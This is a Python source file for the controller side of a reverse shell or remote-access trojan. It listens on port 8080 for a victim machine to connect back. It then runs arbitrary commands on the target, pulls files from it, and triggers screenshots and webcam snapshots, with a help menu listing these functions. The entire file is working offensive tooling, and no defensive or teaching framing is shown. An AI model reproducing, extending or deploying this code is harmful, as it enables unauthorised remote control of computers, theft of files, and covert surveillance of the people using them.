import socket 
import os

def transfer(conn, command):
    
    conn.send(command.encode())
    grab, path = command.split(" ")
    f = open('/root/Desktop/'+path,'wb')
    while True: 
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print ('[+] Transfer completed ')
            break

        if 'File not found'.encode() in bits:
            print('[-] Unable to find out the file')
            break
        f.write(bits)
    
def connecting():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("10.10.10.5", 8080))
    s.listen(1)
    print ('[+] Listening for incoming TCP connection on port 8080')
    conn, addr = s.accept()
    print ('[+] We got a connection from: ', addr)


    while True: 
        command = input("[Target@shell]---> ")
        if 'terminate' in command:
            conn.send('terminate'.encode()) 
            break

        elif 'download' in command: 
            transfer(conn,command)

        elif 'shot' in command:
        	conn.send('shot'.encode())
        	pass

        elif 'snap' in command:
        	conn.send('snap'.encode())
        	pass

        

        elif 'help' in command:
        	print("\tCommand  \t\t\t Discription")
        	print("\t.........\t\t\t ........................")
        	print("\tdownload \t\t\t For File/Folder Download")
        	print("\tshot     \t\t\t For screen shot")
        	print("\tsnap     \t\t\t For webcam snapshot")
        	print("\tterminate\t\t\t End session\n")

        else:
            conn.send(command.encode()) 
            print (conn.recv(1024).decode()) 
        
def main ():
    connecting()
main()